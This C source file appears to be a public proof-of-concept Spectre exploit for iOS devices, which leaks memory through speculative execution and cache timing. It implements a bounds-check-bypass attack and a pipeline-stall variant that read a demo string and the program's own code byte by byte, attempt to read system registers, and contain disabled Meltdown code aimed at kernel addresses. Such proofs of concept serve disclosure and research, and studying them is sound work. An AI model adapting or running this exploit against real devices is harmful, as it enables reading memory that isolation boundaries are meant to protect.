//
// Spectre proof of concept for iOS devices
// https://spectreattack.com
//
// Coded by Vitaly Vidmirov (@vvid)
// Jan 2018
//
// LICENSE: Public Domain / MIT
//

//Tested on
//iPad Air  (A7)
//iPhone SE (A9)
//iPhone 8  (A11)

//some init values
#include "config.h"

#define CACHE_STRIDE        (1<<CACHE_STRIDE_SHIFT)
#define CACHE_LINE_OFFSET   (1<<CACHE_LINE_OFFSET_SHIFT)
#define CACHE_LINE_SIZE     64
#define VICTIM_ARRAY_SIZE   64 //pow2 for simplicity

#define CACHE_EVICT_SIZE    (EVICT_CACHE * 32*1024*1024)
#define TEST_AREA_SIZE      (16*1024)

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <math.h>
#include <unistd.h>
#include <assert.h>

#include "TargetConditionals.h"
#if TARGET_OS_IPHONE && TARGET_IPHONE_SIMULATOR
  #include <x86intrin.h>
  #define TARGET_OS_OSX 0
#elif TARGET_OS_IPHONE
  #define TARGET_OS_OSX 0
#else
  #define TARGET_OS_OSX 1
#endif

#ifdef __arm64__

 #ifdef __ARM_ACLE
 #include <arm_acle.h>
 #endif

//13:LD 11:ISH 10:ISHST 9:ISHLD
  #define DSB(x) __builtin_arm_dsb(x);
  #define DMB(x) __builtin_arm_dmb(x);
  #define DMB_LD DMB(9)      //Load-Load barrier
  #define CL_FLUSH(addr) cacheline_flush(addr)
#else
  #define DSB(x) _mm_mfence();
  #define DMB(x) _mm_lfence();
  #define DMB_LD _mm_lfence();
  #define CL_FLUSH(addr) _mm_clflush(addr)
  #undef USE_RAW_TIMERS
  #define USE_RAW_TIMERS 0
#endif

#include <mach/mach_time.h>
#include <mach/mach_init.h>
#include <mach/thread_policy.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <assert.h>

#define NO_INLINE  __attribute__ ((noinline))
#define ALIGNED(x) __attribute__ ((aligned(x)))

#define CALIB_LOOP_MS    1
#define CALIB_ATTEMPTS   40
#define CYCLES_PER_MS    2000000  //average MHz 1.5-2.5GHz is ok  
#define CALIB_UNROLL     20 //(unrolled 20x internally)
#define CALIB_REPEAT     (CYCLES_PER_MS/CALIB_UNROLL/CALIB_LOOP_MS)
#define INITIAL_WARMUP   4000000

#define countof(arr) (sizeof(arr) / sizeof(arr[0]))
#define POW2_ALIGN(p, a)        ((p + (a - 1)) & ~(a - 1))
#define POW2_ALIGN_PTR(t, p, a) ((t)((uintptr_t(p) + (a - 1)) & ~(a - 1)))

#define DBG if (0)
#define LOG   printf

//show attempts
#define LOG_1 if (0) printf
#define LOG_2 if (0) printf

//asm prototypes
extern void dummy_call(void);
extern int  cpu_workload(int count) NO_INLINE;
extern void calib_seq_add(uint64_t count);
extern void sync_threads(uint64_t thread_id, uint64_t num_threads, int *stop_event,  int *lock_ptr);
extern void cacheline_flush(void *p);
extern void stall_speculate(void *array, void *detector);
extern int victim_1_asm(uint64_t ofs, void *array, void *detector, uint64_t *size_ptr);

//read Ax timers directly (low overhead)
//timebase 24MHz = 125/3 = 41,[6]ns  (83 cycles@2GHz)
uint64_t read_raw_timebase(void);
uint64_t read_raw_timer(void);
extern void stall_speculate_valid_reg(uint64_t shift_right, void *detector);
extern void stall_speculate_invalid_reg(uint64_t shift_right, void *detector);
//

//forward
void print_rect16(int sx, int sy, uint16_t *data, int less) NO_INLINE;

//uint8_t cacheline_1[CACHE_LINE_SIZE] ALIGNED(CACHE_LINE_SIZE);

//keep data close together
static double timebase_double = 0.0;
static mach_timebase_info_data_t timebase = { 0 };
static uint64_t start_of_time = 0;
static volatile int thread_stop_event = 1;
uint64_t g_deps = 0;

uint8_t * transfer_ptr;
uint64_t transfer_size;

int hit_threashold;
int num_timecalls_per_tick = 0;
int num_ticks_per_timecall = 0;
int latency_split = 0;
double cpu_frequency = 0.;

pthread_t measure_thread;
size_t vm_page_size_ = 4096;

uint8_t * cache_detector = NULL;     //[256 * CACHE_STRIDE + CACHE_EVICT_SIZE]
uint8_t * cache_flush_area = NULL;   //[CACHE_EVICT_SIZE] after the end of detector
uint8_t * test_area = NULL;          //[TEST_AREA_SIZE] for access checks

//I use mach_absolute_time() (or raw timers) to measure time
//Timer has 24MHz frequency, too little to detect cache line reload,
//but this effect can be amplified by using TLB miss and cache line cross penalty
//So spectre victim routine is synthetic to fullfill these requirements, for simplicity

#define DETECTOR_PTR(byte, type) ((type*)(&cache_detector[byte*(CACHE_STRIDE + CACHE_LINE_OFFSET) + CACHE_LINE_SPLIT]))
#define DETECTOR_BYTEPTR(byte) DETECTOR_PTR(byte, uint8_t)

uint8_t cacheline_2[CACHE_LINE_SIZE] ALIGNED(CACHE_LINE_SIZE);

uint64_t victim_array_size = 0;    //the size of some legit memory array used by victim_1() routine
uint64_t detector_array_size = 256;

uint8_t cacheline_3[CACHE_LINE_SIZE] ALIGNED(CACHE_LINE_SIZE);

uint8_t victim_array[VICTIM_ARRAY_SIZE] = {0};  //used for out of bound access

uint8_t cacheline_4[CACHE_LINE_SIZE] ALIGNED(CACHE_LINE_SIZE);

uint8_t example_string[] = "Correct Horse Battery Staple";

//-----------------------------------------------------------------------------------------------------------------------------

static inline uint64_t hpctime()
{
#if USE_RAW_TIMERS
    return read_raw_timer();
#else
    return mach_absolute_time();
#endif
}
static inline uint64_t hpctime_delta(uint64_t old)
{
#if USE_RAW_TIMERS
    return read_raw_timer() - old;
#else
    return mach_absolute_time() - old;
#endif
}

void clear_detector()
{
#if EVICT_CACHE  //very slow
    for (size_t i = 0; i < CACHE_EVICT_SIZE; i+= CACHE_LINE_SIZE)
        cache_flush_area[i] += i;
#else
    for (int i = 0; i < 256; i++)
        CL_FLUSH(DETECTOR_PTR(i, uint8_t));

 #if 0 //CLEAR_TLB
    for (size_t j = 0; j < 4; j++)
    for (size_t i = 0; i < CACHE_EVICT_SIZE; i+= vm_page_size_)
    {
        cache_flush_area[i + CACHE_LINE_SIZE * (j * 8 % 64)] += i;
    }
 #endif
#endif
//  DSB(10); //Complete all memory ops
    DMB_LD;
}

//A routine like this should be somewhere in privileged code
//but we'll read from this process
//with iOS meltdown/spectre fix you can't read other process anyway
uint64_t victim_1(uint64_t ofs) NO_INLINE;
uint64_t victim_1(uint64_t ofs) //bounds check bypass
{
    //victim_array_size should not be in cache
    if (ofs < victim_array_size)
    {
      ofs = victim_array[ofs];
      ofs ^= *DETECTOR_PTR(ofs, uintptr_t);
    }
    return ofs;
}

#define SAMPLE_GOOD_SCORE 5
#define SAMPLE_CHECK_SCORE 10

#define SAMPLE_RETRY_OUTER 20
#define SAMPLE_RETRY_INNER 3

// Read memory with Spectre variant 1
// returns -1 if unclear
int read_memory_byte(uint8_t *read_ptr) NO_INLINE;
int read_memory_byte(uint8_t *read_ptr)
{
    uint64_t ofs = (uint64_t)(read_ptr - victim_array);
    uint8_t  score[256] = {};
    uint16_t dtime[256] = {};

    int deps = 0;
    int total_score = 0;
    int first_index = -1;
    for (int r = 0; r<SAMPLE_RETRY_OUTER && first_index < 0; r++)
    {
        int64_t training = (r * 2) & (VICTIM_ARRAY_SIZE-1);
        clear_detector();

        //do multiple times to increase probability of speculative load (required for A7,A9)
        for (int j =0; j<SAMPLE_RETRY_INNER; j++)
        {
            //iterate over valid indices of victim_array
            //and set invalid offset at iteration 0
            for (int64_t i = (VICTIM_ARRAY_SIZE-1); i >= 0; i--)
            {
                //make sure it is not in cache
                CL_FLUSH(&victim_array_size);
                int64_t mask = (i | -i) >> 63;
                int64_t x = (mask & training) | (~mask & ofs);
#ifdef __arm64__ //supply pointers
                deps ^= victim_1_asm(x, victim_array, cache_detector, &victim_array_size);
#else  //C-version requires -O0 on A11
                deps ^= victim_1(x);
#endif
            }
        }
    //    deps ^= victim_1(0x33); //detector test

        //detector: measure time required to fetch specific cacheline
        //each cacheline corresponding to unique value 0..255
        uint64_t min_latency = ~0;
        uintptr_t *ptr = DETECTOR_PTR(0, uintptr_t);
        for (int i=0; i<256; i++)
        {
            DMB_LD;
            uint64_t tb = hpctime();
            ptr = (uintptr_t*)*ptr; //load dependent pointer
            DMB_LD;
            uint64_t td = hpctime_delta(tb);
            deps ^= (uintptr_t)ptr;

            dtime[i] += td;
            if (td <= min_latency && i != training)
            {
                min_latency = td;
                first_index = i;
            }
        }

        if (first_index >= 0) //hit something
        {
            LOG_1("%02x ", first_index);
            score[first_index]++;
            total_score++;
            first_index = -1;
        }
        if (total_score >= SAMPLE_CHECK_SCORE)
        {
            for (int i=0; i<256; i++)
                if (score[i] >= SAMPLE_GOOD_SCORE)
                    first_index = i;
        }
    }

    LOG_1("\n");
    g_deps = deps;

//    print_rect16(16, 16, dtime, latency_split);
    return first_index;
}

//Use call with modified return address to trick return address predictor (RSB - Return Stack Buffer)
int read_memory_byte_2(uint8_t *read_ptr) NO_INLINE;
int read_memory_byte_2(uint8_t *read_ptr)
{
    uint64_t ofs = (uint64_t)(read_ptr - victim_array);
    uint8_t  score[256] = {};
    uint16_t dtime[256] = {};

    int deps = 0;
    int total_score = 0;
    int first_index = -1;
    for (int r = 0; r<SAMPLE_RETRY_OUTER && first_index < 0; r++)
    {
        clear_detector();

        //call twice (==SAMPLE_RETRY_INNER) to increase probability of speculative load (required for A7,A9)
        stall_speculate(&victim_array[ofs], cache_detector);
        stall_speculate(&victim_array[ofs], cache_detector);

        uint64_t min_latency = ~0;
        uintptr_t *ptr = DETECTOR_PTR(0, uintptr_t);
        for (int i=0; i<256; i++)
        {
            DMB_LD;
            uint64_t tb = hpctime();
            ptr = (uintptr_t*)*ptr;
            DMB_LD;
            uint64_t td = hpctime_delta(tb);
            deps ^= (uintptr_t)ptr;

            dtime[i] += td;
            if (td <= min_latency)
            {
                min_latency = td;
                first_index = i;
            }
        }

        if (first_index >= 0) //hit something
        {
            LOG_2("%02x ", first_index);
            score[first_index]++;
            total_score++;
            first_index = -1;
        }
        if (total_score >= SAMPLE_CHECK_SCORE)
        {
            for (int i=0; i<256; i++)
                if (score[i] >= SAMPLE_GOOD_SCORE)
                    first_index = i;
        }
    }
    LOG_2("\n");
    g_deps = deps;

    //print_rect16(16, 16, dtime, latency_split);
    return first_index;
}

static inline int detect_byte(int first_index, uint8_t score[256], int *io_deps, int *total_score) 
{
    int deps = 0;
    uint64_t min_latency = ~0;
    uintptr_t *ptr = DETECTOR_PTR(0, uintptr_t);
    for (int i=0; i<256; i++)
    {
        DMB_LD;
        uint64_t tb = hpctime();
        ptr = (uintptr_t*)*ptr;
        DMB_LD;
        uint64_t td = hpctime_delta(tb);
        deps ^= (uintptr_t)ptr;

        if (td <= min_latency)
        {
            min_latency = td;
            first_index = i;
        }
    }

    if (first_index >= 0) //hit something
    {
        //LOG("%02x ", first_index);
        score[first_index]++;
        total_score[0]++;
        first_index = -1;
    }
    if (*total_score >= SAMPLE_CHECK_SCORE)
    {
        for (int i=0; i<256; i++)
            if (score[i] >= SAMPLE_GOOD_SCORE)
                first_index = i;
    }
    //LOG("\n");
    *io_deps = deps;
    return first_index;
}

uint64_t read_valid_sr()
{
    uint64_t value = 0;
    int deps = 0;
    for (int s = 0; s<7; s++)
    {
        uint8_t score[256] = {};
        int total_score = 0;
        int first_index = -1;
        for (int r = 0; r<20 && first_index < 0; r++)
        {
            clear_detector();
            stall_speculate_valid_reg(s * 8, cache_detector);
            first_index = detect_byte(first_index, score, &deps, &total_score);
        }

        if (first_index > 0)
            value |= first_index << s*8;

        //  print_rect16(16, 16, dtime, latency_split);
    }
    g_deps = deps;
    return value;
}

uint64_t read_invalid_sr()
{
    uint64_t value = 0;
    int deps = 0;
    for (int s = 0; s<7; s++)
    {
        uint8_t score[256] = {};
        int total_score = 0;
        int first_index = -1;
        for (int r = 0; r<20 && first_index < 0; r++)
        {
            clear_detector();
            stall_speculate_invalid_reg(s * 8, cache_detector);
            first_index = detect_byte(first_index, score, &deps, &total_score);
        }

        if (first_index > 0)
            value |= first_index << s*8;

//        print_rect16(16, 16, dtime, latency_split);
    }
    g_deps = deps;
    return value;
}

//--------------------------------------------------------------------------------------

double hpctime_to_ns(uint64_t time)
{
    if (!timebase.denom)
    {
        mach_timebase_info(&timebase);
        LOG("Acquiring timebase %d:%d\n", timebase.numer, timebase.denom);
        timebase_double = (double)timebase.numer / timebase.denom;
    }
    return ((double)time * timebase_double);
}

double hpctime_to_ms(uint64_t time)
{
    return hpctime_to_ns(time) / 1000000.0;
}
double hpctime_to_s(uint64_t time)
{
    return hpctime_to_ns(time) / 1000000000.0;
}

//very approximate. Real frequency is quantized by timebase (24MHz)
double measure_freq()
{
    uint64_t min_time = ~0;
    for (int i = 0; i < CALIB_ATTEMPTS; i++)
    {
        uint64_t tb = hpctime();
        calib_seq_add(CALIB_UNROLL * CALIB_REPEAT);
        uint64_t td = hpctime_delta(tb);
        if (min_time > td)
            min_time = td;
    }
    if (min_time > num_ticks_per_timecall)
       min_time -= num_ticks_per_timecall;
    return CALIB_UNROLL * CALIB_REPEAT / hpctime_to_s(min_time);
}

//do some stupid crunching int/fpu/mem
int cpu_workload(int iterations)
{
    uint32_t mem[256];
    float fi = 1;
    uint32_t idx = mem[0];
    for (int i=0; i<iterations; i++)
    {
        for (int j=0; j<64; j++)
          idx = idx * mem[i + j & 255];
        fi *= (float)idx + 1.1 / (float)i + 10;
        mem[i & 255] = idx;
    };
    return (int)fi + mem[0];
};

void print_rect16(int sx, int sy, uint16_t *data, int less)
{
    for (int y=0; y<sy; y++)
    {
        LOG("%02x: ", y*sx);
        for (int x=0; x<sx; x++)
            LOG("%04x%c", (int)(data[y*sx+x]), (data[y*sx+x])<less ? '*':' ');
        LOG("\n");
    }
}

void print_memdump(int sx, int sy, uint8_t *data, int limited)
{
    for (int y=0; y<sy; y++)
    {
        if (limited == 0)
            LOG("%05x: ", y*sx);
        for (int x=0; x<sx; x++)
            LOG("%02x ", (int)(data[y*sx+x]));
        if (limited == 0)
        {
            LOG(": ");
            for (int x=0; x<sx; x++)
            {
                int byte = data[y*sx+x]; 
                LOG("%c", (byte >= 0x20 && byte < 0x7f) ? (uint8_t)byte : '.');
            }
        }
        LOG("\n");
    }
}

uint64_t prepare()
{
    cpu_workload(INITIAL_WARMUP);

#if !USE_RAW_TIMERS
    //calculate number of timer syscalls to get two distinct values
    int delta_ticks = 0;
    int syscall_rate = 0;
    for (int i = 0; i < CALIB_ATTEMPTS; i++)
    {
      uint64_t cnt = 0;
      uint64_t d, s = hpctime();
      do
      {
          d = hpctime();
      } while (s == d);
      s = d;
      do
      {
          d = hpctime();
          cnt++;
      } while (s == d);

      if (syscall_rate < cnt)
      {
          syscall_rate = (int)cnt;
          delta_ticks = (int)(d - s);
      }
    }

    num_timecalls_per_tick = syscall_rate;
    num_ticks_per_timecall = delta_ticks;
#endif

    clear_detector(); //burn some cycles before measurement

    cpu_frequency = measure_freq();
    LOG("Sanity check...\nCore freq: %d MHz\nTimer freq: %d Hz\n", (int)((cpu_frequency + 499999) / 1000000.), (int)(1./hpctime_to_s(1)));

#ifdef __arm64__
    LOG("Read registers:\n CNTFRQ_EL0=%ld\n", __arm_rsr64("CNTFRQ_EL0"));
    LOG(" TPIDRRO_EL0=%0lx\n", __arm_rsr64("TPIDRRO_EL0"));
#endif

#if USE_RAW_TIMERS == 0
    LOG("Calibrate timer: mach_absolute_time() %d ticks per call\n", num_ticks_per_timecall);
#endif

    //init detector  (add pointer chasing loop)  TODO: random?
    uintptr_t *next_ptr = DETECTOR_PTR(0, uintptr_t);
    for (int i=255; i >= 0; i--)
    {
        uintptr_t *ptr = DETECTOR_PTR(i, uintptr_t);
        *ptr = (uintptr_t)next_ptr;
        next_ptr = ptr; 
    }

    //write some values for non-speculative access
    for (int i = 0; i<sizeof(victim_array); i++)
        victim_array[i] = i;
    victim_array_size = VICTIM_ARRAY_SIZE-4; //set limit at 64

    uint64_t avg_min_latency = 0;
    uint64_t avg_max_latency = 0;

    //measure cache miss latency for all elements
    uint64_t deps = 0; //force optimizer not to remove our calculations
    for (int t=0; t<9; t++)
    { 
        clear_detector();
        hpctime(); //make sure it is in I$ for first iteration

        uint64_t min_latency = ~0;
        uint64_t max_latency = 0;
        for (size_t r = 0; r < 2; r++)
        {
            DMB_LD;
            uint64_t tb = hpctime();
            uintptr_t *ptr = DETECTOR_PTR(0, uintptr_t);
            for (size_t i = 0; i < 256/4; i++)
            {
                ptr = (uintptr_t*)*ptr;
                ptr = (uintptr_t*)*ptr;
                ptr = (uintptr_t*)*ptr;
                ptr = (uintptr_t*)*ptr;
            }
            DMB_LD;
            uint64_t td = hpctime_delta(tb);
            deps ^= *ptr;
            if (td > num_ticks_per_timecall)
               td -= num_ticks_per_timecall;
            if (min_latency > td)
                min_latency = td;
            if (max_latency < td)
                max_latency = td;
        }

        double sc = 1./256;
        LOG("Probe %d latency hit: %.3f ns (%.2f c) / %.3f ticks  miss: %.3f ns (%.2f c) / %.3f ticks\n", t+1,
            sc * hpctime_to_ns(min_latency),
            sc * cpu_frequency * hpctime_to_s(min_latency),
            sc * min_latency,
            sc * hpctime_to_ns(max_latency),
            sc * cpu_frequency * hpctime_to_s(max_latency),
            sc * max_latency);

        min_latency /= 256;
        max_latency /= 256;

        if (t == 0)
        {
            avg_min_latency = min_latency;
            avg_max_latency = max_latency;
        }
        else
        {
            //step towards each other
            if (avg_min_latency < min_latency)
              avg_min_latency = min_latency;
            if (avg_max_latency > max_latency)
              avg_max_latency = max_latency;
        }
    }

    latency_split = (int)(avg_min_latency+1 + avg_max_latency) / 2;  //0..1 timer overhead min latency
    LOG("Latency split %d ticks (%d - %d)\n", (int)latency_split, (int)avg_min_latency+1, (int)avg_max_latency);

    int valid_detections = 0;

#define NUM_DETECTION_TEST_ATTEMPTS 1

    uint16_t vsucc[256];
    uint16_t dtime1[256];
    uint16_t dtime2[256];

    //try detection quality with perfect cache
    for (int t=0; t<NUM_DETECTION_TEST_ATTEMPTS; t++)
    {
        for (int v=0; v<256; v++)
        {
            vsucc[v] = 0xffff;
            clear_detector();

            //Load line
            deps ^= *DETECTOR_PTR(v, uintptr_t);

            //detect
            uint64_t min_latency = ~0;
            int first_index = -1;
            uintptr_t *ptr = DETECTOR_PTR(0, uintptr_t);
            for (int i=0; i<256; i++)
            {
                DMB_LD;
                uint64_t tb = hpctime();
                ptr = (uintptr_t*)*ptr;
                DMB_LD;
                uint64_t td = hpctime_delta(tb);
                deps ^= (uintptr_t)ptr;

                dtime1[i] = td;
                if (td <= min_latency)
                {
                    min_latency = td;
                    first_index = i;
                }
            }

            if (v == first_index)
            {
                vsucc[v] = first_index;
                valid_detections++;
            }
            else
                memcpy(dtime2, dtime1, sizeof(dtime2));
        }
    }

    int first_failed = -1;
    for (int v=0; v<256; v++)
        if (vsucc[v] == 0xffff)
        {
             first_failed = v;
             break;
        }

    LOG("Detection test (%d x 256), valid %d (%.1f %%)", NUM_DETECTION_TEST_ATTEMPTS,
              valid_detections, 100. * valid_detections / (NUM_DETECTION_TEST_ATTEMPTS * 256));

    if (first_failed >= 0)
    {
        LOG(", first error %02x\n", first_failed);
#if DUMP_DETECTION_ERRORS
        print_rect16(16, 16, vsucc,  0);
        LOG("Time stamps:\n");
        print_rect16(16, 16, dtime2, latency_split);
#endif
    }
    else
        LOG("\n");

    return deps;
};

#include <mach/vm_map.h>
#include <mach/mach_error.h>

uint8_t *phys_alloc(size_t size)
{
    uint8_t *addr;
    kern_return_t ret;

    if ((ret = vm_allocate(mach_task_self(), (vm_address_t*)&addr, size, TRUE)) != KERN_SUCCESS)
    {
        mach_error("vm_allocate failed: ", ret);
        exit(1);
    }

    memset(addr, 0xff, size);

    for (size_t i = 0; i < size; i+= CACHE_LINE_SIZE)
        addr[i] = i;

    return addr;
}

void phys_free(uint8_t *addr, size_t size)
{
    kern_return_t ret;
    if ((ret = vm_deallocate(mach_task_self(), (vm_address_t)addr, size)) != KERN_SUCCESS)
    {
        mach_error("vm_deallocate failed: ", ret);
        exit(1);
    }
}


void dump_area(uint8_t* ptr, size_t size, size_t incrsize)
{
    uint8_t temp_area[0x100];
    for (uint64_t i = 0; i<size && !thread_stop_event; i += incrsize)
    {
        LOG("%16p: ", ptr+i);
        for (int j = 0; j<16; j++)
            temp_area[j] = read_memory_byte_2(ptr+i + j) & 255;
        print_memdump(16, 1, temp_area, 1);
    }
}

void *run_thread(/*void *thread_id*/)
{
    LOG("Spectre test for iOS\n");

    //allocate page-aligned blocks
    vm_page_size_ = sysconf(_SC_PAGESIZE);
    LOG("Page size %d\n", (int)vm_page_size_);

    size_t detector_size = POW2_ALIGN(256 * CACHE_STRIDE, vm_page_size_);
    cache_detector   = phys_alloc(detector_size + CACHE_EVICT_SIZE + vm_page_size_);
    cache_flush_area = cache_detector + detector_size;
    test_area        = phys_alloc(TEST_AREA_SIZE);

    //prepare tables and do some tests
    prepare();

#if __arm64__
    LOG("Read usermode MSR (CNTFRQ_EL0) %016llx\n", read_valid_sr());
    LOG("Read privileged MSR (MIDR_EL1) %016llx\n", read_invalid_sr()); //doesn't work
#endif

    transfer_ptr = example_string;
    transfer_size = countof(example_string);

#if 1
    LOG("\nReading data with Variant 1: bounds check bypass\n");
    //spectre v1
    for (int i = 0; i<transfer_size && !thread_stop_event; i++)
    {
        int byte = read_memory_byte(transfer_ptr+i) & 255;
        LOG("%16p: %02x (%c) real: %02x\n", transfer_ptr+i, byte, (byte >= 0x20 && byte < 0x7f) ? byte : '?', transfer_ptr[i]);
    }
#endif

#if 1
    LOG("\nReading data with pipeline stall\n");
    for (int i = 0; i<transfer_size && !thread_stop_event; i++)
    {
        int byte = read_memory_byte_2(transfer_ptr+i) & 255;
        LOG("%16p: %02x (%c) real: %02x\n", transfer_ptr+i, byte, (byte >= 0x20 && byte < 0x7f) ? byte : '?', transfer_ptr[i]);
    }
#endif

#if 1
    LOG("\nReading code with pipeline stall\n");
    transfer_size = 0x100;
    transfer_ptr = (uint8_t*)&victim_1;
    dump_area(transfer_ptr, transfer_size, 16);
#endif

    //no luck with Meltdown so far :)

#if 0
    //prepare test_memory
    for (size_t i = 0; i < TEST_AREA_SIZE; i++)
        test_area[i] = i & 0xff;
    int res = vm_protect(mach_task_self(), (vm_address_t)test_area, TEST_AREA_SIZE, 0, VM_PROT_WRITE);
    assert(res == 0);

    LOG("\nReading W/O data with Variant 3: Rogue cacheline load\n");
    //meltdown
    transfer_ptr = (uint8_t*)test_area;
    transfer_size          = 0x100;
    dump_area(transfer_ptr, transfer_size, 16);
#endif

#if 0
    LOG("\nReading data with Variant 3: Rogue cacheline load\n");
    //meltdown
    transfer_ptr = (uint8_t*)0xFFFFFF0000000000ULL;
    transfer_size          = 0x0000010000000000ULL;
    dump_area(transfer_ptr, transfer_size, vm_page_size_ * 64*16);
#endif

    phys_free(test_area, TEST_AREA_SIZE);
    phys_free(cache_detector, detector_size + CACHE_EVICT_SIZE + vm_page_size_);
    pthread_exit(NULL);
}

void start_thread()
{
    transfer_ptr = example_string;
    transfer_size = countof(example_string);

    mach_port_t port;
    int res = pthread_create_suspended_np(&measure_thread, NULL, run_thread, (void *)0);
    assert(res == 0);
    port = pthread_mach_thread_np(measure_thread);
    thread_affinity_policy_data_t policy_data = { (int)0 };
    thread_policy_set(port, THREAD_AFFINITY_POLICY, (thread_policy_t)&policy_data, THREAD_AFFINITY_POLICY_COUNT);

    start_of_time = hpctime();
    thread_stop_event = 0;

    thread_resume(port);
}

void stop_thread()
{
    thread_stop_event = 1;
    pthread_join(measure_thread, NULL);
}
